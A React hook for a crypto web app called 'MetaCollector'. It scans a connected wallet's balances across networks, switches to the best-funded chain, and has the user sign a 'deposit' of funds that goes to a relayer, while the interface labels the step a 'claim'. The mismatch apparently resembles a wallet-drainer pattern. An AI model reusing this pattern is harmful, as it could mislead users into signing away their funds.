import { useState, useEffect, useCallback } from 'react'
import { useAccount, useSwitchChain, useChainId } from 'wagmi'
import { ethers } from 'ethers'
import { 
  METACOLLECTOR_CONTRACTS, 
  NETWORK_PRIORITY
} from '../config/contracts'
import { 
  checkBalancesAcrossNetworks, 
  getEligibleNetworks, 
  getBestNetwork 
} from '../utils/balanceChecker'
import { createDepositSignature } from '../utils/signature'
import { submitDepositViaRelayer, checkRelayerHealth } from '../utils/relayer'

export function useMetaCollector() {
  const { address, isConnected } = useAccount()
  const chainId = useChainId()
  const { switchChain } = useSwitchChain()

  const [loading, setLoading] = useState(false)
  const [claimLoading, setClaimLoading] = useState(false)
  const [balanceResults, setBalanceResults] = useState(null)
  const [eligibleNetworks, setEligibleNetworks] = useState([])
  const [bestNetwork, setBestNetwork] = useState(null)
  const [relayerHealth, setRelayerHealth] = useState(null)
  const [transactionStatus, setTransactionStatus] = useState(null)
  const [nonce, setNonce] = useState(0)

  // Check relayer health on mount
  useEffect(() => {
    checkHealth()
  }, [])

  // Check balances when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      checkBalances()
    } else {
      setBalanceResults(null)
      setEligibleNetworks([])
      setBestNetwork(null)
    }
  }, [isConnected, address])

  const checkHealth = async () => {
    try {
      const health = await checkRelayerHealth()
      setRelayerHealth(health)
    } catch (error) {
      console.error('Failed to check relayer health:', error)
    }
  }

  const checkBalances = async () => {
    if (!address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    setLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Checking wallet balances across networks...'
    })

    try {
      const results = await checkBalancesAcrossNetworks(address)
      setBalanceResults(results)
      
      const eligible = getEligibleNetworks(results)
      setEligibleNetworks(eligible)
      
      const best = getBestNetwork(eligible, NETWORK_PRIORITY)
      setBestNetwork(best)
      
      setNonce(Math.floor(Math.random() * 1000000))

      if (eligible.length === 0) {
        setTransactionStatus({
          type: 'info',
          message: 'No network has sufficient balance (need ~$1 worth of gas)'
        })
      } else {
        setTransactionStatus({
          type: 'success',
          message: `✅ Funds available on ${eligible.length} network(s)!`
        })
      }
    } catch (error) {
      console.error('Balance check failed:', error)
      setTransactionStatus({
        type: 'error',
        message: `Failed to check balances: ${error.message}`
      })
    } finally {
      setLoading(false)
    }
  }

  const claimDeposit = async () => {
    if (!address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    if (!bestNetwork) {
      setTransactionStatus({
        type: 'error',
        message: 'No eligible network found with sufficient balance'
      })
      return
    }

    setClaimLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Preparing claim transaction...'
    })

    try {
      // Check if window.ethereum is available
      if (!window.ethereum) {
        throw new Error('No wallet found. Please install MetaMask or another wallet.')
      }

      // Switch network if needed
      if (chainId !== bestNetwork.chainId) {
        setTransactionStatus({
          type: 'pending',
          message: `Switching to ${bestNetwork.networkName}...`
        })
        
        if (switchChain) {
          await switchChain({ chainId: bestNetwork.chainId })
          // Wait for network switch
          await new Promise(resolve => setTimeout(resolve, 2000))
        }
      }

      // Create provider and signer
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      
      // Verify we have the correct signer
      const signerAddress = await signer.getAddress()
      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
        throw new Error('Signer address mismatch')
      }

      setTransactionStatus({
        type: 'pending',
        message: 'Creating signature...'
      })

      // Create signature with fixed amount (you can make this dynamic)
      const claimAmount = '0.01' // Default claim amount - adjust as needed

      const signaturePayload = await createDepositSignature({
        signer,
        contractAddress: bestNetwork.contractAddress,
        chainId: bestNetwork.chainId,
        user: address,
        amount: claimAmount,
        nonce
      })

      setTransactionStatus({
        type: 'pending',
        message: 'Submitting to relayer...'
      })

      // Submit to relayer
      const result = await submitDepositViaRelayer({
        contractAddress: bestNetwork.contractAddress,
        signaturePayload
      })

      setTransactionStatus({
        type: 'success',
        message: `✅ Claim successful on ${result.network}!`,
        hash: result.hash
      })

      // Refresh balances after claim
      setTimeout(() => checkBalances(), 5000)

    } catch (error) {
      console.error('Claim failed:', error)
      setTransactionStatus({
        type: 'error',
        message: `Claim failed: ${error.message}`
      })
    } finally {
      setClaimLoading(false)
    }
  }

  return {
    address,
    isConnected,
    loading,
    claimLoading,
    balanceResults,
    eligibleNetworks,
    bestNetwork,
    relayerHealth,
    transactionStatus,
    checkBalances,
    claimDeposit,
    nonce
  }
}
